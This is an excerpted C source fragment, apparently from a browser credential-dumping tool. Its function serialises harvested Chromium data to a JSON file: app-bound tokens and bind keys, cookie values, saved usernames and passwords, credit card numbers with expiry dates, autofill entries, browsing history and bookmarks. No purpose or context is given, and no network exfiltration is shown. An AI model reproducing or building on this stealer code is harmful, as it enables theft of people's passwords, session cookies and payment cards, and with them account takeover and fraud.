...
BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFilePath, IN BOOL bShowAll)
{
    ...
    else
    {
        ...
        {
            ASCII_JSON_WRITE("    {\n");
            ASCII_JSON_WRITE("      \"service\": "); WriteJsonString(hFile, pChromiumData->pTokens[i].pszService); ASCII_JSON_WRITE(",\n");
            ASCII_JSON_WRITE("      \"token\": "); WriteJsonBinaryAsString(hFile, pChromiumData->pTokens[i].pbToken, pChromiumData->pTokens[i].dwTokenLen); ASCII_JSON_WRITE(",\n");
            ASCII_JSON_WRITE("      \"bind_key\": "); WriteJsonHex(hFile, pChromiumData->pTokens[i].pbBindKey, pChromiumData->pTokens[i].dwBindKeyLen); ASCII_JSON_WRITE("\n");
            ASCII_JSON_WRITE("    }");
    ...
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"host\": "); WriteJsonString(hFile, pChromiumData->pCookies[i].pszHostKey); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"path\": "); WriteJsonString(hFile, pChromiumData->pCookies[i].pszPath); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"name\": "); WriteJsonString(hFile, pChromiumData->pCookies[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"value\": "); WriteJsonBinaryAsString(hFile, pChromiumData->pCookies[i].pbValue, pChromiumData->pCookies[i].dwValueLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"expires_utc\": "); WriteJsonTimestamp(hFile, pChromiumData->pCookies[i].llExpiresUtc); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ...
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"origin_url\": "); WriteJsonString(hFile, pChromiumData->pLogins[i].pszOriginUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"action_url\": "); WriteJsonString(hFile, pChromiumData->pLogins[i].pszActionUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"username\": "); WriteJsonString(hFile, pChromiumData->pLogins[i].pszUsername); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"password\": "); WriteJsonBinaryAsString(hFile, pChromiumData->pLogins[i].pbPassword, pChromiumData->pLogins[i].dwPasswordLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_created\": "); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateCreated); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_last_used\": "); WriteJsonTimestamp(hFile, pChromiumData->pLogins[i].llDateLastUsed); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ...
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"name_on_card\": "); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNameOnCard); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"nickname\": "); WriteJsonString(hFile, pChromiumData->pCreditCards[i].pszNickname); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"card_number\": "); WriteJsonBinaryAsString(hFile, pChromiumData->pCreditCards[i].pbCardNumber, pChromiumData->pCreditCards[i].dwCardNumberLen); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"expiration_month\": "); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationMonth); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"expiration_year\": "); WriteJsonDword(hFile, pChromiumData->pCreditCards[i].dwExpirationYear); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_modified\": "); WriteJsonTimestamp(hFile, pChromiumData->pCreditCards[i].llDateModified); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ...
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"name\": "); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"value\": "); WriteJsonString(hFile, pChromiumData->pAutofill[i].pszValue); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"count\": "); WriteJsonDword(hFile, pChromiumData->pAutofill[i].dwCount); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_created\": "); WriteJsonTimestamp(hFile, pChromiumData->pAutofill[i].llDateCreated); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ...
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"url\": "); WriteJsonString(hFile, pChromiumData->pHistory[i].pszUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"title\": "); WriteJsonString(hFile, pChromiumData->pHistory[i].pszTitle); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"visit_count\": "); WriteJsonDword(hFile, pChromiumData->pHistory[i].dwVisitCount); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"last_visit_time\": "); WriteJsonTimestamp(hFile, pChromiumData->pHistory[i].llLastVisitTime); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
    ...
    {
        ASCII_JSON_WRITE("    {\n");
        ASCII_JSON_WRITE("      \"name\": "); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszName); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"url\": "); WriteJsonString(hFile, pChromiumData->pBookmarks[i].pszUrl); ASCII_JSON_WRITE(",\n");
        ASCII_JSON_WRITE("      \"date_added\": "); WriteJsonTimestamp(hFile, pChromiumData->pBookmarks[i].llDateAdded); ASCII_JSON_WRITE("\n");
        ASCII_JSON_WRITE("    }");
        if (i < dwCount - 1) ASCII_JSON_WRITE(",");
        ASCII_JSON_WRITE("\n");
    }
